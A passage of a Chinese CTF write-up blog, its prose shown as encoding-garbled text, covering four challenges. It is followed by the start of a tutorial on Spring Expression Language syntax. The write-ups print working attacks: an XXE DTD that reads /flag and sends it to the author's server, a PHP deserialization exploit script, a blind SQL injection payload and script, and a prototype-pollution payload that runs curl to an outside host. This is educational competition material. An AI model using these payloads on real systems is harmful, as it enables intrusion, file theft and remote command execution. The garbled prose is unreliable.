          if ((filename != null) &amp;&amp; (!filename.trim().equals(&quot;&quot;)))
          {
            String fileExtName = filename.substring(filename.lastIndexOf(&quot;.&quot;) + 1);

            InputStream in = fileItem.getInputStream();
            if ((filename.startsWith(&quot;excel-&quot;)) &amp;&amp; (&quot;xlsx&quot;.equals(fileExtName))) {
              try
              {
                Workbook wb1 = WorkbookFactory.create(in);
                Sheet sheet = wb1.getSheetAt(0);
                System.out.println(sheet.getFirstRowNum());
              }
              catch (InvalidFormatException e)
              {
                System.err.println(&quot;poi-ooxml-3.10 has something wrong&quot;);
                e.printStackTrace();
              }
            }
            String saveFilename = makeFileName(filename);
            request.setAttribute(&quot;saveFilename&quot;, saveFilename);
            request.setAttribute(&quot;filename&quot;, filename);

            String realSavePath = makePath(saveFilename, savePath);

            FileOutputStream out = new FileOutputStream(realSavePath + &quot;/&quot; + saveFilename);

            byte[] buffer = new byte[&#39;?&#39;];

            int len = 0;
            while ((len = in.read(buffer)) &gt; 0) {
              out.write(buffer, 0, len);
            }
            in.close();

            out.close();

            message = &quot;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½!&quot;;
          }
        }
      }
    }
    catch (FileUploadException e)
    {
      e.printStackTrace();
    }
    request.setAttribute(&quot;message&quot;, message);
    request.getRequestDispatcher(&quot;/ListFileServlet&quot;).forward(request, response);
  }

  private String makeFileName(String filename)
  {
    return UUID.randomUUID().toString() + &quot;_&quot; + filename;
  }

  private String makePath(String filename, String savePath)
  {
    int hashCode = filename.hashCode();
    int dir1 = hashCode &amp; 0xF;
    int dir2 = (hashCode &amp; 0xF0) &gt;&gt; 4;

    String dir = savePath + &quot;/&quot; + dir1 + &quot;/&quot; + dir2;

    File file = new File(dir);
    if (!file.exists()) {
      file.mkdirs();
    }
    return dir;
  }
}
</code></pre>
<p>åœ¨æŠ¥é”™ä¸­æˆ‘ä»¬çœ‹åˆ° poi-ooxml-3.10<br>è°·æ­Œä¸‹å¯ä»¥å‘ç°å®ƒå…¶å®æ˜¯æœ‰ä¸ªæ¼æ´çš„<a href="https://www.cnblogs.com/iyiyang/articles/10055824.html" target="_blank" rel="noopener">https://www.cnblogs.com/iyiyang/articles/10055824.html</a></p>
<p>åœ¨æœåŠ¡å™¨ä¸Šæ”¾ä¸ªevil.dtd,å†…å®¹ä¸ºï¼š</p>
<pre><code class="xml=">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;
&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http://ccreater.top:60004/?%file;&#39;&gt;&quot;&gt;
%all;
</code></pre>
<p>åˆ†åˆ«åœ¨ <code>[Content_Types].xmlã€/xl/workbook.xmlã€/xl/worksheets/shee1.xml</code>  ä¸­æ·»åŠ <br><code>&lt;!DOCTYPE ANY SYSTEM &quot;http://ccreater.top:60000/evil.dtd&quot;&gt;  åœ¨æ ¹å…ƒç´ ä¸­æ·»åŠ &lt;b&gt;&amp;send&lt;/b&gt;</code></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200510180925.png" alt="image9568"></p>
<p> ç›‘å¬ç«¯å£æ‹¿åˆ°flag</p>
<h3 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h3><pre><code class="php">&lt;?php

class FileHandler {

    public $op;
    public $filename;
    public $content;

    function __construct() {
        $op = &quot;2e0&quot;;
        $filename = &quot;flag.php&quot;;
    }

    public function set($filename) {
        $this-&gt;op = &#39;2e0&#39;;
        $this-&gt;filename = $filename;
    }
}


$url = &#39;http://5f56366ab1864e38b5d46f4b070e8082a5878207423a4008.cloudgame1.ichunqiu.com/?str=&#39;;

$file = new FileHandler;
$file-&gt;set($_GET[1]);

$payload = urlencode(serialize($file));
echo file_get_contents($url . $payload);

#echo urlencode(serialize($payload));

</code></pre>
<p>åˆ©ç”¨å¼±ç±»å‹æ¯”è¾ƒæ¥ç»•è¿‡<code>if($this-&gt;op === &quot;2&quot;)$this-&gt;op = &quot;1&quot;;</code><br>å°†FileHandlerä¸­çš„å˜é‡æ”¹ä¸ºpublicæ¥ç»•è¿‡is_validçš„é™åˆ¶<br>è¯»å– /proc/self/cmdline å¾—çŸ¥é…ç½®æ–‡ä»¶ï¼š<code>/web/config/httpd.conf</code><br>è¯»å–é…ç½®æ–‡ä»¶å¾—çŸ¥ webç›®å½•ï¼š<code>DocumentRoot &quot;/web/html&quot;</code><br>è¯»å–flag:<code>/web/html/flag.php</code></p>
<h3 id="trace"><a href="#trace" class="headerlink" title="trace"></a>trace</h3><p>åªæœ‰ä¸€ä¸ªregister.php,fuzzæ–¹å‘å­˜åœ¨sqlæ³¨å…¥æ¼æ´<br>ç”±äºé¢˜ç›®é™åˆ¶æœ€å¤šåªèƒ½æ’å…¥20ä¸ªæ•°æ®ï¼Œäºæ˜¯æˆ‘ä»¬è®©mysqlåœ¨è¿ç®—çš„æ—¶å€™æŠ¥é”™å°±ä¸ä¼šæ’å…¥æ•°æ®ï¼Œé¿å…äº†å¤šæ¬¡é‡å¼€å®¹å™¨çš„éº»çƒ¦<br>æµ‹è¯•åï¼Œå…·ä½“payloadä¸º:<code>username=&#39;,&#39;aaa&#39;-if(ascii(select substr(database(),1,1))&gt;1,sleep(5)-exp(~(select * from(select user())a)),exp(~(select * from(select user())a))))%23&amp;password=aaa</code></p>
<p>å› ä¸ºinformation_schemaè¢«è¿‡æ»¤ï¼Œè¿˜æœ‰å…¶ä»–çš„ä¸€äº›èƒ½å¤ŸæŸ¥è¯¢è¡¨åçš„è¡¨ä¸å­˜åœ¨ï¼Œäºæ˜¯åªèƒ½çŒœæµ‹è¡¨å</p>
<p>ç›²æ³¨è„šæœ¬ï¼š</p>
<pre><code class="python">import requests
import time


#ä¿®æ”¹biggerå’Œsqlinjå°±å¥½


#å®ç°biggeræ‰èƒ½ä½¿ç”¨
def findByDichotomy(begin,end):
    max_num=end
    while True:
        mid=int((begin+end)/2)
        if begin==max_num:
            return False
        if begin==end:
            return begin
        if end-begin==1:
            if bigger(begin):
                return end
            else:
                return begin
        if bigger(mid):
            begin=mid+1
        else:
            end=mid
#å¾…æ±‚æ•°æ®å¤§äºnum
def bigger(num):
    time.sleep(0.5)
    sql=&quot;select group_concat(b) from (select (select 1)a,(select 2)b union select * from flag)`table`&quot;
    burp0_url = &quot;http://2e22e4f7edf54994ae0a08c8acf108e6b85804ee8a8144c6.cloudgame2.ichunqiu.com:80/register_do.php&quot;
    burp0_cookies = {&quot;UM_distinctid&quot;: &quot;16f8014229c357-04d5c848290106-6701b35-240000-16f8014229d768&quot;, &quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943&quot;: &quot;1587227364&quot;, &quot;Hm_lpvt_2d0601bd28de7d49818249cf35d95943&quot;: &quot;1589089931&quot;, &quot;__jsluid_h&quot;: &quot;5303c9bcf8d25c671142a156f959a817&quot;}
    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://2e22e4f7edf54994ae0a08c8acf108e6b85804ee8a8144c6.cloudgame2.ichunqiu.com/register.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    burp0_data = {&quot;username&quot;: &quot;&#39;,&#39;aaa&#39;-if((ascii(substr(( {sql} ),{POS},2))&gt;{GUESS}),sleep(2)-exp(~(select * from(select user())a)),exp(~(select * from(select user())a))))#&quot;.format(GUESS=num,POS=pos,sql=sql), &quot;password&quot;: &quot;aaa&quot;}
    try:
        r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,timeout=2)
    except Exception:
        return True
    print(&quot;test &quot;+str(num))
    print(r.text)
    return False
def less(num):
    pass
def equal(num):
    pass


#1,flag{}
result=&quot;2,flag{&quot;
pos=len(result)+1
while True:
    num=findByDichotomy(32,128)
    if num is False:
        print(result)
        break
    result+=chr(num)
    print(result)
    pos+=1</code></pre>
<h3 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h3><p>æºä»£ç :</p>
<pre><code class="javascript">var express = require(&#39;express&#39;);
var path = require(&#39;path&#39;);
const undefsafe = require(&#39;undefsafe&#39;);
const { exec } = require(&#39;child_process&#39;);


var app = express();
class Notes {
    constructor() {
        this.owner = &quot;whoknows&quot;;
        this.num = 0;
        this.note_list = {};
    }

    write_note(author, raw_note) {
        this.note_list[(this.num++).toString()] = {&quot;author&quot;: author,&quot;raw_note&quot;:raw_note};
    }

    get_note(id) {
        var r = {}
        undefsafe(r, id, undefsafe(this.note_list, id));
        return r;
    }

    edit_note(id, author, raw) {
        undefsafe(this.note_list, id + &#39;.author&#39;, author);
        undefsafe(this.note_list, id + &#39;.raw_note&#39;, raw);
    }

    get_all_notes() {
        return this.note_list;
    }

    remove_note(id) {
        delete this.note_list[id];
    }
}

var notes = new Notes();
notes.write_note(&quot;nobody&quot;, &quot;this is nobody&#39;s first note&quot;);


app.set(&#39;views&#39;, path.join(__dirname, &#39;views&#39;));
app.set(&#39;view engine&#39;, &#39;pug&#39;);

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, &#39;public&#39;)));


app.get(&#39;/&#39;, function(req, res, next) {
  res.render(&#39;index&#39;, { title: &#39;Notebook&#39; });
});

app.route(&#39;/add_note&#39;)
    .get(function(req, res) {
        res.render(&#39;mess&#39;, {message: &#39;please use POST to add a note&#39;});
    })
    .post(function(req, res) {
        let author = req.body.author;
        let raw = req.body.raw;
        if (author &amp;&amp; raw) {
            notes.write_note(author, raw);
            res.render(&#39;mess&#39;, {message: &quot;add note sucess&quot;});
        } else {
            res.render(&#39;mess&#39;, {message: &quot;did not add note&quot;});
        }
    })

app.route(&#39;/edit_note&#39;)
    .get(function(req, res) {
        res.render(&#39;mess&#39;, {message: &quot;please use POST to edit a note&quot;});
    })
    .post(function(req, res) {
        let id = req.body.id;
        let author = req.body.author;
        let enote = req.body.raw;
        if (id &amp;&amp; author &amp;&amp; enote) {
            notes.edit_note(id, author, enote);
            res.render(&#39;mess&#39;, {message: &quot;edit note sucess&quot;});
        } else {
            res.render(&#39;mess&#39;, {message: &quot;edit note failed&quot;});
        }
    })

app.route(&#39;/delete_note&#39;)
    .get(function(req, res) {
        res.render(&#39;mess&#39;, {message: &quot;please use POST to delete a note&quot;});
    })
    .post(function(req, res) {
        let id = req.body.id;
        if (id) {
            notes.remove_note(id);
            res.render(&#39;mess&#39;, {message: &quot;delete done&quot;});
        } else {
            res.render(&#39;mess&#39;, {message: &quot;delete failed&quot;});
        }
    })

app.route(&#39;/notes&#39;)
    .get(function(req, res) {
        let q = req.query.q;
        let a_note;
        if (typeof(q) === &quot;undefined&quot;) {
            a_note = notes.get_all_notes();
        } else {
            a_note = notes.get_note(q);
        }
        res.render(&#39;note&#39;, {list: a_note});
    })

app.route(&#39;/status&#39;)
    .get(function(req, res) {
        let commands = {
            &quot;script-1&quot;: &quot;uptime&quot;,
            &quot;script-2&quot;: &quot;free -m&quot;
        };
        for (let index in commands) {
            exec(commands[index], {shell:&#39;/bin/bash&#39;}, (err, stdout, stderr) =&gt; {
                if (err) {
                    return;
                }
                console.log(`stdout: ${stdout}`);
            });
        }
        res.send(&#39;OK&#39;);
        res.end();
    })


app.use(function(req, res, next) {
  res.status(404).send(&#39;Sorry cant find that!&#39;);
});


app.use(function(err, req, res, next) {
  console.error(err.stack);
  res.status(500).send(&#39;Something broke!&#39;);
});


const port = 8080;
app.listen(port, () =&gt; console.log(`Example app listening at http://localhost:${port}`))
</code></pre>
<p>è°·æ­Œå‘ç°unsafeçš„æŸäº›ç‰ˆæœ¬å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ <a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940</a></p>
<p>é˜…è¯»ä»£ç å‘ç°å¯ä»¥é€šè¿‡edit_noteæ¥æ±¡æŸ“åŸå‹é“¾ç»“åˆstatuså¤„æ¥å‘½ä»¤æ‰§è¡Œ</p>
<p>payload:<code>id=__proto__.abc&amp;author=curl http://http.requestbin.buuoj.cn/19tjk5d1?aaaaa=1&amp;raw=ls</code></p>
<p>ä»¤æˆ‘æœ‰äº›ä¸è§£çš„æ˜¯ï¼Œæˆ‘æœ¬åœ°å¤ç°payloadä¸ºï¼š<code>id=__proto__&amp;author=curl http://http.requestbin.buuoj.cn/19tjk5d1?aaaaa=1&amp;raw=ls</code>,æœ¬åœ°æ˜¯å¯ä»¥çš„ï¼Œæ‰“é¶æœºçš„æ—¶å€™åè€Œä¸è¡Œ</p>
<p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/05/12/2020å¹´ç½‘é¼æ¯é’é¾™ç»„/">http://blog.ccreater.top/2020/05/12/2020å¹´ç½‘é¼æ¯é’é¾™ç»„/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/05/12/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/" data-id="cka3ckr1s0006v4v05xso7y8g" data-title="2020å¹´ç½‘é¼æ¯é’é¾™ç»„" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/05/06/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time class="dt-published" datetime="2020-05-06T07:13:00.196Z" itemprop="datePublished">2020-05-06</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/05/06/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´"><a href="#SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´" class="headerlink" title="SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´"></a>SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>Spring Expression Languageï¼ˆç®€ç§°SpELï¼‰ã€‚SpELå¼•æ“ä½œä¸ºSpring ç»„åˆé‡Œçš„è¡¨è¾¾å¼è§£æçš„åŸºç¡€ ï¼Œä½†å®ƒä¸ç›´æ¥ä¾èµ–äºSpring,å¯ç‹¬ç«‹ä½¿ç”¨ã€‚ </p>
<h2 id="SpELæµ‹è¯•ä»£ç "><a href="#SpELæµ‹è¯•ä»£ç " class="headerlink" title="SpELæµ‹è¯•ä»£ç "></a>SpELæµ‹è¯•ä»£ç </h2><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(&quot;&#39;Hello World&#39;&quot;);
//Expression randomPhrase = parser.parseExpression(&quot;123&quot;,new TemplateParserContext());
String message = (String) exp.getValue();
//String message = exp.getValue(String.class);
</code></pre>
<p> ä¸Šè¿°ä»£ç å«ä¹‰ä¸ºé¦–å…ˆåˆ›å»º<code>ExpressionParser</code>è§£æè¡¨è¾¾å¼ï¼Œä¹‹åæ”¾ç½®è¡¨è¾¾å¼ï¼Œæœ€åé€šè¿‡<code>getValue</code>æ–¹æ³•æ‰§è¡Œè¡¨è¾¾å¼ï¼Œé»˜è®¤å®¹å™¨æ˜¯springæœ¬èº«çš„å®¹å™¨ï¼š<code>ApplicationContext</code>ã€‚ </p>
<p><code>TemplateParserContext</code>æ·»åŠ äº† <strong>è¡¨è¾¾å¼æ¨¡æ¿</strong> è§£æå™¨</p>
<h2 id="SpELè¯­æ³•"><a href="#SpELè¯­æ³•" class="headerlink" title="SpELè¯­æ³•"></a>SpELè¯­æ³•</h2><h3 id="ä½¿ç”¨SpELæ¥å£è¿›è¡Œè¡¨è¾¾å¼æ±‚å€¼"><a href="#ä½¿ç”¨SpELæ¥å£è¿›è¡Œè¡¨è¾¾å¼æ±‚å€¼" class="headerlink" title="ä½¿ç”¨SpELæ¥å£è¿›è¡Œè¡¨è¾¾å¼æ±‚å€¼"></a>ä½¿ç”¨SpELæ¥å£è¿›è¡Œè¡¨è¾¾å¼æ±‚å€¼</h3><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(&quot;&#39;Hello World&#39;&quot;);
String message = (String) exp.getValue();</code></pre>
<h3 id="æ–¹æ³•è°ƒç”¨ï¼Œè®¿é—®å±æ€§ï¼Œè°ƒç”¨æ„é€ å‡½æ•°"><a href="#æ–¹æ³•è°ƒç”¨ï¼Œè®¿é—®å±æ€§ï¼Œè°ƒç”¨æ„é€ å‡½æ•°" class="headerlink" title="æ–¹æ³•è°ƒç”¨ï¼Œè®¿é—®å±æ€§ï¼Œè°ƒç”¨æ„é€ å‡½æ•°"></a>æ–¹æ³•è°ƒç”¨ï¼Œè®¿é—®å±æ€§ï¼Œè°ƒç”¨æ„é€ å‡½æ•°</h3><p>è¿™äº›éƒ½å’Œå¹³æ—¶çš„javaæ²¡ä»€ä¹ˆä¸åŒ,demo:</p>
<p>è®¿é—®å±æ€§ï¼š</p>
<pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(&quot;&#39;123&#39;.bytes&quot;);
System.out.println((Object)exp.getValue());</code></pre>
<p>æ–¹æ³•è°ƒç”¨ï¼š</p>
<pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(&quot;&#39;123&#39;.length()&quot;);
System.out.println((Object)exp.getValue());</code></pre>
<p>è°ƒç”¨æ„é€ å‡½æ•°ï¼š</p>
<pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(&quot;new String(1234)&quot;);
System.out.println((Object)exp.getValue());</code></pre>
<h3 id="è®¿é—®æ ¹å¯¹è±¡å±æ€§æ–¹æ³•ç­‰"><a href="#è®¿é—®æ ¹å¯¹è±¡å±æ€§æ–¹æ³•ç­‰" class="headerlink" title="è®¿é—®æ ¹å¯¹è±¡å±æ€§æ–¹æ³•ç­‰"></a>è®¿é—®æ ¹å¯¹è±¡å±æ€§æ–¹æ³•ç­‰</h3><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
        Expression exp = parser.parseExpression(&quot;fucker+tou()&quot;);
        System.out.println((Object)exp.getValue(new Object(){
            public String fucker=&quot;fucker&quot;;
            public String tou(){
                return &quot;toutoutou&quot;;
            };
        }));</code></pre>
<p>ç»“æœï¼š<code>fuckertoutoutou</code></p>
<h3 id="ä¼ é€’æ ¹å¯¹è±¡-root"><a href="#ä¼ é€’æ ¹å¯¹è±¡-root" class="headerlink" title="ä¼ é€’æ ¹å¯¹è±¡/#root"></a>ä¼ é€’æ ¹å¯¹è±¡/#root</h3><h4 id="StandardEvaluationContext"><a href="#StandardEvaluationContext" class="headerlink" title="StandardEvaluationContext"></a>StandardEvaluationContext</h4><pre><code class="java">// Create and set a calendar
GregorianCalendar c = new GregorianCalendar();
c.set(1856, 7, 9);

// The constructor arguments are name, birthday, and nationality.
Inventor tesla = new Inventor(&quot;Nikola Tesla&quot;, c.getTime(), &quot;Serbian&quot;);

ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(&quot;name&quot;);

EvaluationContext context = new StandardEvaluationContext(tesla);
String name = (String) exp.getValue(context);</code></pre>
<p>è¿™é‡Œçš„root object æ˜¯ tesla,<code>parser.parseExpression(&quot;name&quot;);</code>ä¼šè¿”å›teslaçš„nameå±æ€§</p>
<h4 id="getValue"><a href="#getValue" class="headerlink" title="getValue"></a>getValue</h4><pre><code class="java">// Create and set a calendar
GregorianCalendar c = new GregorianCalendar();
c.set(1856, 7, 9);

// The constructor arguments are name, birthday, and nationality.
Inventor tesla = new Inventor(&quot;Nikola Tesla&quot;, c.getTime(), &quot;Serbian&quot;);

ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(&quot;name&quot;);
String name = (String) exp.getValue(tesla);</code></pre>
<h3 id="æ•°ç»„å’Œåˆ—è¡¨å’Œå­—å…¸-å–å€¼"><a href="#æ•°ç»„å’Œåˆ—è¡¨å’Œå­—å…¸-å–å€¼" class="headerlink" title="æ•°ç»„å’Œåˆ—è¡¨å’Œå­—å…¸ å–å€¼"></a>æ•°ç»„å’Œåˆ—è¡¨å’Œå­—å…¸ å–å€¼</h3><p> å±æ€§åçš„ç¬¬ä¸€ä¸ªå­—æ¯å¯ä»¥æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚æ•°ç»„å’Œåˆ—è¡¨çš„å†…å®¹å¯ä»¥ä½¿ç”¨æ–¹æ‹¬å·æ¥æ ‡è®° </p>
<pre><code class="java">ExpressionParser parser = new SpelExpressionParser();

// Inventions Array
StandardEvaluationContext teslaContext = new StandardEvaluationContext(tesla);

// evaluates to &quot;Induction motor&quot;
String invention = parser.parseExpression(&quot;inventions[3]&quot;).getValue(
        teslaContext, String.class);

// Members List
StandardEvaluationContext societyContext = new StandardEvaluationContext(ieee);

// evaluates to &quot;Nikola Tesla&quot;
String name = parser.parseExpression(&quot;Members[0].Name&quot;).getValue(
        societyContext, String.class);

// List and Array navigation
// evaluates to &quot;Wireless communication&quot;
String invention = parser.parseExpression(&quot;Members[0].Inventions[6]&quot;).getValue(
        societyContext, String.class);</code></pre>
<p> Mapsçš„å€¼ç”±æ–¹æ‹¬å·å†…æŒ‡å®šå­—ç¬¦ä¸²çš„Keyæ¥æ ‡è¯†å¼•ç”¨ã€‚åœ¨ä¸‹é¢è¿™ä¸ªä¾‹å­ä¸­ï¼Œå› ä¸ºOfficers mapçš„Keyæ˜¯stringç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è¿‡å­—ç¬¦ä¸²å¸¸é‡æŒ‡å®šã€‚ </p>
<pre><code class="java">// Officer&#39;s Dictionary

Inventor pupin = parser.parseExpression(&quot;Officers[&#39;president&#39;]&quot;).getValue(
        societyContext, Inventor.class);

// evaluates to &quot;Idvor&quot;
String city = parser.parseExpression(&quot;Officers[&#39;president&#39;].PlaceOfBirth.City&quot;).getValue(
        societyContext, String.class);

// setting values
parser.parseExpression(&quot;Officers[&#39;advisors&#39;][0].PlaceOfBirth.Country&quot;).setValue(
        societyContext, &quot;Croatia&quot;);</code></pre>
<h3 id="å£°æ˜æ•°ç»„åˆ—è¡¨å’Œå­—å…¸"><a href="#å£°æ˜æ•°ç»„åˆ—è¡¨å’Œå­—å…¸" class="headerlink" title="å£°æ˜æ•°ç»„åˆ—è¡¨å’Œå­—å…¸"></a>å£°æ˜æ•°ç»„åˆ—è¡¨å’Œå­—å…¸</h3><p>åˆ—è¡¨ï¼š</p>
<pre><code class="java">// evaluates to a Java list containing the four numbers
List numbers = (List) parser.parseExpression(&quot;{1,2,3,4}&quot;).getValue(context);

List listOfLists = (List) parser.parseExpression(&quot;{{'a','b'},{'x','y'}}&quot;).getValue(context);</code></pre>
<p>å­—å…¸ï¼š</p>
<pre><code class="java">// evaluates to a Java map containing the two entries
Map inventorInfo = (Map) parser.parseExpression(&quot;{name:&#39;Nikola&#39;,dob:&#39;10-July-1856&#39;}&quot;).getValue(context);

Map mapOfMaps = (Map) parser.parseExpression(&quot;{name:{first:&#39;Nikola&#39;,last:&#39;Tesla&#39;},dob:{day:10,month:&#39;July&#39;,year:1856}}&quot;).getValue(context);</code></pre>
<p>æ•°ç»„ï¼š</p>
<p> æ•°ç»„å¯ä»¥ä½¿ç”¨ç±»ä¼¼äºJavaçš„è¯­æ³•åˆ›å»ºï¼Œåˆ›å»ºæ—¶å¯ä»¥äº‹å…ˆæŒ‡å®šæ•°ç»„çš„å®¹é‡å¤§å°ã€è¿™ä¸ªæ˜¯å¯é€‰çš„ã€‚ åœ¨åˆ›å»ºå¤šç»´æ•°ç»„æ—¶è¿˜ä¸æ”¯æŒäº‹å…ˆæŒ‡å®šåˆå§‹åŒ–çš„å€¼ã€‚</p>
<pre><code class="java">int[] numbers1 = (int[]) parser.parseExpression(&quot;new int[4]&quot;).getValue(context);</code></pre>
<h3 id="Tæ“ä½œç¬¦"><a href="#Tæ“ä½œç¬¦" class="headerlink" title="Tæ“ä½œç¬¦"></a>Tæ“ä½œç¬¦</h3><p><code>T()</code>è¿ç®—ç¬¦ä¼šè°ƒç”¨ç±»ä½œç”¨åŸŸçš„æ–¹æ³•å’Œå¸¸é‡ã€‚ </p>
<p> Tæ“ä½œç¬¦æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ“ä½œç¬¦ã€å¯ä»¥åŒäºæŒ‡å®šjava.lang.Classçš„å®ä¾‹ï¼ˆç±»å‹ï¼‰ã€‚é™æ€æ–¹æ³•ä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªæ“ä½œç¬¦è°ƒç”¨ã€‚  *<em>T()å¼•ç”¨java.langåŒ…é‡Œé¢çš„ç±»å‹ä¸éœ€è¦é™å®šåŒ…å…¨åï¼Œä½†æ˜¯å…¶ä»–ç±»å‹çš„å¼•ç”¨å¿…é¡»è¦ã€‚ *</em></p>
<pre><code class="java">Class dateClass = parser.parseExpression(&quot;T(java.util.Date)&quot;).getValue(Class.class);

Class stringClass = parser.parseExpression(&quot;T(String)&quot;).getValue(Class.class);

boolean trueValue = parser.parseExpression(
        &quot;T(java.math.RoundingMode).CEILING &gt;= T(java.math.RoundingMode).FLOOR&quot;)
        .getValue(Boolean.class);</code></pre>
<h3 id="è¡¨è¾¾å¼æ¨¡æ¿"><a href="#è¡¨è¾¾å¼æ¨¡æ¿" class="headerlink" title="è¡¨è¾¾å¼æ¨¡æ¿"></a>è¡¨è¾¾å¼æ¨¡æ¿</h3><p> è¡¨è¾¾å¼æ¨¡æ¿è¿è¡Œåœ¨ä¸€æ®µæ–‡æœ¬ä¸­æ··åˆåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæ±‚å€¼è¡¨è¾¾å¼æ¨¡å—ã€‚å„ä¸ªæ±‚å€¼å—éƒ½é€šè¿‡å¯è¢«è‡ªå®šä¹‰çš„å‰åç¼€å­—ç¬¦åˆ†éš”ï¼Œä¸€ä¸ªé€šç”¨çš„é€‰æ‹©æ˜¯ä½¿ç”¨#{ }ä½œä¸ºåˆ†éš”ç¬¦ã€‚ </p>
<pre><code class="java">String randomPhrase = parser.parseExpression(
        &quot;random number is #{T(java.lang.Math).random()}&quot;,
        new TemplateParserContext()).getValue(String.class);</code></pre>
<p>ç»“æœï¼š<code>random number is xxxx</code></p>
<h3 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h3><p> è¡¨è¾¾å¼ä¸­çš„å˜é‡å¯ä»¥é€šè¿‡è¯­æ³•#å˜é‡åä½¿ç”¨ã€‚å˜é‡å¯ä»¥åœ¨StandardEvaluationContextä¸­é€šè¿‡æ–¹æ³•setVariableè®¾ç½®ã€‚ </p>
<h4 id="thiså’Œrootå˜é‡"><a href="#thiså’Œrootå˜é‡" class="headerlink" title="thiså’Œrootå˜é‡"></a>thiså’Œrootå˜é‡</h4><p> #thiså˜é‡æ°¸è¿œæŒ‡å‘å½“å‰è¡¨è¾¾å¼æ­£åœ¨æ±‚å€¼çš„å¯¹è±¡ï¼ˆè¿™æ—¶ä¸éœ€è¦é™å®šå…¨åï¼‰ã€‚å˜é‡#rootæ€»æ˜¯æŒ‡å‘æ ¹ä¸Šä¸‹æ–‡å¯¹è±¡ã€‚#thisåœ¨è¡¨è¾¾å¼ä¸åŒéƒ¨åˆ†è§£æè¿‡ç¨‹ä¸­å¯èƒ½ä¼šæ”¹å˜ï¼Œä½†æ˜¯#rootæ€»æ˜¯æŒ‡å‘æ ¹ </p>
<h3 id="æ˜“é”™ç‚¹"><a href="#æ˜“é”™ç‚¹" class="headerlink" title="æ˜“é”™ç‚¹"></a>æ˜“é”™ç‚¹</h3><p>T()å’Œnewä¸€ä¸ªç±»æ—¶ é™¤äº†java.langä¸‹çš„ç±»ï¼Œå…¶ä»–ç±»éƒ½è¦éœ€è¦éœ€è¦é™å®šåŒ…å…¨å</p>
